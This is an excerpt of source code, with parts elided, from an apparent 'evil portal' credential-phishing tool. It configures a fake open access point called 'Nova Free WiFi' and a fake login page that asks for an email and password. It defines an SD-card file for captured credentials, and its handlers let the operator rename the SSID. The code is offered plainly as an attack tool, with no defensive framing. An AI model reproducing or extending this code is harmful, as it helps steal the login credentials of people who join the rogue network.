...
#define DEFAULT_AP_SSID_NAME "Nova Free WiFi"
#define SD_CREDS_PATH "/Nova-portal-creds.txt"



// Run-time localization macros used from localization.h
#define LOGIN_TITLE TXT_PL_TITLE
#define LOGIN_SUBTITLE TXT_PL_SUBTITLE
#define LOGIN_EMAIL_PLACEHOLDER TXT_PL_EMAIL
#define LOGIN_PASSWORD_PLACEHOLDER TXT_PL_PASS
#define LOGIN_MESSAGE TXT_PL_MSG
#define LOGIN_BUTTON TXT_PL_BTN
#define LOGIN_AFTER_MESSAGE TXT_PL_WAIT
#define TYPE_SSID_TEXT TXT_PL_SSID_INST

// Init Captured Credentials
...
String ssid_GET() {
  return getHtmlContents("<p>Set a new SSID for Nova Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}
...
String ssid_POST() {
  ...
  setSSID(ssid);
  printHomeToScreen();
  return getHtmlContents("Nova Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
}
